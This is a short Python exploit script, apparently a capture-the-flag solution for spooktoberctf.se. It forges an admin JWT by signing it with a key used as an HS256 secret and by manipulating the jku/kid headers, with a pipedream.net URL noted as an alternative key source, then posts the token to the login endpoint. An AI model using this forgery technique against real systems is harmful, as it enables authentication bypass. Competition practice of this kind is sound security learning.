import jwt
import requests

URI = 'http://spooktoberctf.se:22081/login'
URI_ROOT = 'http://spooktoberctf.se'
payload = {
  "exp": 1666805487,
  "iat": 1666719087,
  "sub": "test",
  "admin": True,
  "jku": "http://spooktoberctf.se:22081/jwks"  # "http://spooktoberctf.se:22081/jwks" / https://eoc8pvuz3mzrajb.m.pipedream.net
}

# Byta ut jku mot

headers = {
  "kid": "k-IllUiseh7r95nhS-qnfYLgGlzJ4vN13aKrpopyeOk"
#    'x5u': 'https://eoc8pvuz3mzrajb.m.pipedream.net'
}

#payload['exp'] = payload['exp'] - 100000
#payload['iat'] = payload['iat'] - 100000


hemligt = """-----BEGIN PRIVATE KEY-----
MCQwDQYJKoZIhvcNAQEBBQADEwAwEAIGAJqHbpbrAgZ7Gmid6e0=
-----END PRIVATE KEY-----"""

hemliga_bytes = str.encode(hemligt)

# hemligt = "MCQwDQYJKoZIhvcNAQEBBQADEwAwEAIGAJqHbpbrAgZ7Gmid6e0="



token = jwt.encode(payload, hemliga_bytes, headers=headers, algorithm='HS256')

# decoded = jwt.decode(token, 'secret', algorithms=['HS256'])


proxies = {
   'http': 'http://localhost:8080',
   'https': 'http://localhost:8080'
}

# token = requests.get('http://spooktoberctf.se:22081/token').json()['token']

proxies=None
r = requests.post(URI, json={'jwt': token, "admin": True}, proxies=proxies)
res = r.text

print()